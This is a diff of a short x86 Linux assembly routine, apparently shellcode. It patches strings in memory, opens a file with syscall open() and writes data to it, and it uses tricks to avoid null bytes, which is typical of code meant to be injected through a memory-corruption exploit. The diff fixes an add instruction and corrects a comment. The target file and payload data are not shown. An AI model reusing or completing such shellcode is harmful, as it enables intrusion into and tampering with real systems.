@@ -8,8 +8,9 @@ pop             esi
 xor             eax, eax
 mov byte        [esi + 7], al   ; bytes to #
 mov byte        [esi + 14], al   ; bytes to second #
-mov byte	al, 0x01
-add byte	[esi + 8], al
+mov byte	al, 0x1
+add byte	al, [esi + 8]
+mov byte	[esi + 8 ], al
 lea             ebx, [esi + 8]  ; get address
 mov long        [esi + 15], ebx  ; bytes to xxxx
 mov             al, 5            ; the syscall open() = 5 
@@ -21,7 +22,7 @@ int             0x80             ; kernel int
 mov long        ebx,eax          ; get the descriptor
 mov             al, 4 
 mov             ecx,[esi + 15]   ; the location of our data
-mov             dx,9996           ; A trick to get 9 in dx without getting null bytes
+mov             dx,9996           ; A trick to get 6 in dx without getting null bytes
 sub             dx,9990
 
 int             0x80             ; kernel interrupt
